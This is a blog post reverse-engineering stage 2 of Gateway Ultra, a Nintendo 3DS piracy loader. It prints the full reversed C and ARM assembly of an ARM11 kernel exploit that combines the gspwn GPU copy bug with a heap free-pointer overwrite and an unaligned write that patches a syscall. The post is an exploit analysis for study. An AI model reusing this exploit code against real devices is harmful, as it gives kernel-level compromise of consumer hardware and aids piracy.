---
author: yifanlu
comments: true
date: 2015-01-15 09:26:43-06:00
layout: post
slug: reversing-gateway-ultra-stage-2-owning-arm11-kernel
title: 'Reversing Gateway Ultra Stage 2: Owning ARM11 Kernel'
wordpress_id: 1020
categories:
- 3DS
- Assembly
- C
- Technical
tags:
- 3ds
- arm11
- exploit
- gateway
- heap overflow
- kernel
- memory
- syscall
---

It's been a couple of days since my [initial](/2015/01/10/reversing-gateway-ultra-first-stage-part-1/) [analysis](/2015/01/12/reversing-gateway-ultra-first-stage-part-2/) of Gateway Ultra, released last week to enable piracy on 3DS. I spent most of this time catching up on the internals of the 3DS. I can't thank the maintainers of [3dbrew](http://3dbrew.org/) enough (especially yellows8, the master of 3DS reversing) for the amount of detailed and technical knowledge found on the wiki. The first stage was a warmup and did not require any specific 3DS knowledge to reverse. The problem with the second stage is that while it is easy to see the exploit triggered and code to run, the actual exploit itself was not as clear. I looked at all the function calls made and made a couple of hypothesis of where the vulnerability resided, and reversed each function to the end to test my hypothesis. Although there was many dead ends and false leads, the process of reversing all these functions solidified my understanding of the system.<!-- more -->


## Code


As always, I like to post the reversed code first so those with more knowledge than me don't have to read my verbose descriptions. I will explain the interesting parts afterwards. I am including the full code listing of the shellcode including parts that are irrelevant either because it is used as obfuscation, to provide stability, or as setup for later parts.

```c
int memcpy(void *dst, const void *src, unsigned int len);
int GX_SetTextureCopy(void *input_buffer, void *output_buffer, unsigned int size, 
                      int in_x, int in_y, int out_x, int out_y, int flags);
int GSPGPU_FlushDataCache(void *addr, unsigned int len);
int svcSleepThread(unsigned long long nanoseconds);
int svcControlMemory(void **outaddr, unsigned int addr0, unsigned int addr1, 
                     unsigned int size, int operation, int permissions);

int
do_gspwn_copy (void *dst, unsigned int len, unsigned int check_val, int check_off)
{
    unsigned int result;

    do
    {
        memcpy (0x18401000, 0x18401000, 0x10000);
        GSPGPU_FlushDataCache (0x18402000, len);
        // src always 0x18402000
        GX_SetTextureCopy(0x18402000, dst, len, 0, 0, 0, 0, 8);
        GSPGPU_FlushDataCache (0x18401000, 16);
        GX_SetTextureCopy(dst, 0x18401000, 0x40, 0, 0, 0, 0, 8);
        memcpy(0x18401000, 0x18401000, 0x10000);
        result = *(unsigned int *)(0x18401000 + check_off);
    } while (result != check_val);

    return 0;
}

int
arm11_kernel_exploit_setup (void)
{
    unsigned int patch_addr;
    unsigned int *buffer;
    int i;
    int (*nop_func)(void);
    int *ipc_buf;
    int model;

    // part 1: corrupt kernel memory
    buffer = 0x18402000;
    // 0xFFFFFE0 is just stack memory for scratch space
    svcControlMemory(0xFFFFFE0, 0x18451000, 0, 0x1000, 1, 0); // free page
    patch_addr = *(int *)0x08F028A4;
    buffer[0] = 1;
    buffer[1] = patch_addr;
    buffer[2] = 0;
    buffer[3] = 0;
    // overwrite free pointer
    do_gspwn_copy(0x18451000, 0x10u, patch_addr, 4);
    // trigger write to kernel
    svcControlMemory(0xFFFFFE0, 0x18450000, 0, 0x1000, 1, 0);

    // part 2: obfuscation or trick to clear code cache
    for (i = 0; i &lt; 0x1000; i++)
    {
        buffer[i] = 0xE1A00000; // ARM NOP instruction
    }
    buffer[i-1] = 0xE12FFF1E; // ARM BX LR instruction
    nop_func = *(unsigned int *)0x08F02894 - 0x10000; // 0x10000 below current code
    do_gspwn_copy(*(unsigned int *)0x08F028A0 - 0x10000, 0x10000, 0xE1A00000, 0);
    nop_func ();

    // part 3: get console model for future use (?)
    __asm__ ("mrc p15,0,%0,c13,c0,3\t\n"
             "add %0, %0, #128\t\n" : "=r" (ipc_buf));

    ipc_buf[0] = 0x50000;
    __asm__ ("mov r4, %0\t\n"
             "mov r0, %1\t\n"
             "ldr r0, [r0]\t\n"
             "svc 0x32\t\n" :: "r" (ipc_buf), "r" (0x3DAAF0) : "r0", "r4");

    if (ipc_buf[1])
    {
        model = ipc_buf[2] &amp; 0xFF;
    }
    else
    {
        model = -1;
    }
    *(int *)0x8F01028 = model;

    return 0;
}

// after running setup, run this to execute func in ARM11 kernel mode
int __attribute__((naked))
arm11_kernel_exploit_exec (int (*func)(int, int, int), int arg1, int arg2)
{
    __asm__ ("mov r5, %0\t\n" // R5 = 0x3D1FFC, not used. likely obfusction.
             "svc 8\t\n" // CreateThread syscall, corrupted, args not needed
             "bx lr\t\n" :: "r" (0x3D1FFC) : "r5");
}
```


## Vulnerability


The main vulnerability is actually still [gspwn](http://smealum.net/?p=517). Whereas in the first stage, it was used to overwrite (usually read-only) code from a CRO dynamic library to get userland code execution, it is now used to overwrite a heap free pointer so when the next memory page is freed, it would overwrite kernel memory.


## 3DS Memory Layout


To understand how the free pointer write corruption works, let's first go over how the 3DS memory is laid out (in simple terms). You can get the full picture [here](http://3dbrew.org/wiki/Memory_layout), but I want to go over some key points. First, the "main" memory (used by applications and services) called the FCRAM is located at physical address 0x20000000 to 0x28000000. It is mapped in virtual memory in many places. First, the main application which is at around FCRAM 0x23xxxxxx (or higher if it is a system process or applet like the web browser) is mapped to 0x00100000 as read-only. Next we have some pages in the FCRAM 0x24xxxxxx region that can be mapped by the application on demand to virtual address 0x18xxxxxx through the syscall [**ControlMemory**](http://3dbrew.org/wiki/SVC). Finally, the entire FCRAM is mapped in kernel 0xF0000000 - 0xF8000000 (this is for 4.1, different in other versions).

Another note about memory is that the ARM11 kernel is not located in the FCRAM, but in something called the AXI WRAM. The name is not important, but what is important is that it's physical address 0x1FF80000 is mapped twice in kernel memory space. 0xFFF60000 is marked read-only executable and 0xEFF80000 is marked read-write non-executable. However, writing to 0xEFF80000 will allow you to execute the code at 0xFFF60000, which defeats the whole purpose of marking the pages non-executable. Since these mappings only apply in kernel mode, you would still need to perform a write to that address with kernel permissions.


## ControlMemory Unchecked Write


The usual process for handling user controlled pointers in a syscall is to use the special ARM instructions LDRT and STRT, which performs the pointer dereference with user privileges in kernel mode. However, what if we overwrite a pointer that the developers did not think is user controlled? It would use the regular LDR/STR instructions and dereference with kernel privileges. The goal is achieved by the ControlMemory syscall along with gspwn. The ControlMemory syscall is used to allocate and free pages of memory from the heap region of the FCRAM. When it is called to free, like most heap allocators, certain pointers are stored in the newly freed memory block (to point to the next and previous free blocks). Like most heap allocators, it also performs "coalescing," which means two free blocks will be combined to form a larger free block (and the pointers to and from it is updated accordantly).

The plan here is to free a block of memory, which places certain pointers in the freed block. This is usually safe since once the user frees the block, it is unmapped from the user virtual memory space and they cannot access the memory any more. However, we can with gspwn, so we overwrite the free pointer with gspwn to overwrite the code in the 0xEFF80000 region. And that is possible because the pointer dereference is done with kernel permissions because the pointers stored here is not normally user accessible.

The data stored in the freed region is as follows:

```c
struct
{
    int some_count;
    struct free_data *next_free_block;
    struct free_data *prev_free_block;
    int unk_C;
    int unk_10;
} free_data;
```

When the first ControlMemory call happens in the exploit, it frees FCRAM 0x24451000 and writes the free_data structure to it. We then use gspwn to overwrite next_free_block to point to the kernel code we want to overwrite. Next we call ControlMemory to free the page immediately before (FCRAM 0x24450000). This will coalesce the block with
[code language="c"]((struct free_data *)0x24450000)->next_free_block = ((struct free_data *)0x24451000)->next_free_block;
((struct free_data *)0x24451000)->next_free_block->prev_free_block = (struct free_data *)0x24450000;
[/code]
As you can see, we control next_free_block of 0x24451000 and therefore control the write.

... But we're not done yet. The above pseudocode was an artist rendition of what happens. Obviously, physical addresses are not used here. The user region virtual address (0x18xxxxxx) is not used either. The pointers here are the kernel virtual address 0xF4450000 and 0xF4451000. Since we can only write the value 0xF4450000 (or on 9.2, it is 0xE4450000), this poses a problem. Ideally, we want to write some ARM instruction that allows us to jump to code we control (BX R0 for example), however, 0xF4450000 assembles to "vst4.8{d16-d19}, [r5], r0" (don't worry, I don't know what that is either) and 0xE4450000 assembles to "strb r0, [r5], #-0". Both of which can't be used (obviously) to control code execution. Now of course, we can try another address and see if we get lucky and the address happens to compile to a branch instruction, but we are not lucky. None of the user mappable/unmappable regions would give us a branch.


## Unaligned Code Corruption


Here is the clever idea. What if we stop thinking of the problem as: how do I write an instruction that gives us execution control? but instead as: how do I corrupt the code to control it? I don't usually like to post assembly listings, but it is impossible to dodge ARM assembly if you made it this far.

A note to systems programmers: There is a feature of ARMv6 that the 3DS enabled called unaligned read/write. This means a pointer does NOT have to be word aligned. In other words, you are allowed to write 4 bytes arbitrary to any address including something like "0x1003". Now if you're not a systems designer and don't know about the problem of unaligned reads/writes (C nicely hides this from you), don't worry, it just means everything works as you expect it to.

Let's take a look at an arbitrary syscall, CreateThread. The actual syscall doesn't matter, we only care about the assembly code that it runs:

```    
       0:	e52de004 	push	{lr}		; (str lr, [sp, #-4]!)
       4:	e24dd00c 	sub	sp, sp, #12
       8:	e58d4004 	str	r4, [sp, #4]
       c:	e58d0000 	str	r0, [sp]
      10:	e28d0008 	add	r0, sp, #8
      14:	eb001051 	bl	0x4160
      18:	e59d1008 	ldr	r1, [sp, #8]
      1c:	e28dd00c 	add	sp, sp, #12
      20:	e49df004 	pop	{pc}		; (ldr pc, [sp], #4)
```


How do we patch this to control code flow? What if we get rid of the "add" on line 0x1c? Then we have on line 0xc, *SP = R0 and on line 0x20, PC = *SP, and since we trivially control R0 in a syscall, we can pass in a function pointer and run it.

Now if we replace the code at 0x18 with either 0xF4450000 or 0xE4450000, another problem arises. Both of those instructions (and there may be others from other firmware versions) try to dereference R5, which we don't control. However, what if we write 0xF4450000/0xE4450000 starting at 0x1B? It would now corrupt two instructions instead of just one, but both are "safe" instructions.

```
    ...
      14:	eb001051 	bl	0x4160
      18:	009d1008 	addseq	r1, sp, r8
      1c:	e2e44500 	rsc	r4, r4, #0, 10
    ...
```


The actual code that is there isn't particularly useful/important, which is exactly what we want. We successfully patched the kernel to jump to our code with a single syscall. Now making SVC 8 with R0 pointing to some function would run it in ARM11 kernel mode.


## Closing


Although some may call this exploit overly simple, I thought the way it was exploited was very novel. It involved overwriting pointers that are meant to be inaccessible to users, then a type confusion of pointer to ARM code, and finally abusing unaligned writes to corrupt instructions in a safe way. Next time, I hope to conclude this series by reversing the ARM9 kernel exploit (for those unfamiliar, the 3DS has two kernels, one for applications and one for security, ARM9 is the interesting one). I want to thank, again, **sbJFn5r** for providing me with various dumps.
